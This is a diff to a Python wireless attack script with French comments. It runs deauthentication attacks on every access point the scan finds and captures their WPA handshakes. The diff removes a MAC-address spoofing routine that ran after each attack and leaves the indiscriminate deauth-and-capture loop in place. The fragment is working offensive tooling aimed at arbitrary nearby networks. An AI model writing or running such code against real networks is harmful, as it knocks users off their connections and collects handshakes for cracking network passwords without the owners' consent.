@@ -50,14 +50,6 @@ def deauth_attack(ap_address):
         logging.info(f"Paquet de désauthentification envoyé à {ap_address}")
         time.sleep(1)
 
-def change_mac():
-    # Changer l'adresse MAC à une adresse aléatoire
-    new_mac = "00:11:22:33:44:55"  # Remplacez ceci par une adresse MAC valide
-    os.system(f"ifconfig {interface} down")
-    os.system(f"ifconfig {interface} hw ether {new_mac}")
-    os.system(f"ifconfig {interface} up")
-    logging.info(f"Adresse MAC changée en {new_mac}")
-
 if __name__ == "__main__":
     networks = scan_wifi()
 
@@ -66,5 +58,4 @@ if __name__ == "__main__":
             mac_address = line.split(" - ")[0]
             logging.info(f"Démarrage de l'attaque de désauthentification sur {mac_address}")
             deauth_attack(mac_address)
-            capture_handshake(mac_address)  # Capturer le handshake avant de changer l'adresse MAC
-            change_mac()  # Changer l'adresse MAC après chaque attaque
+            capture_handshake(mac_address)  # Capturer le handshake avant de passer à l'adresse suivante
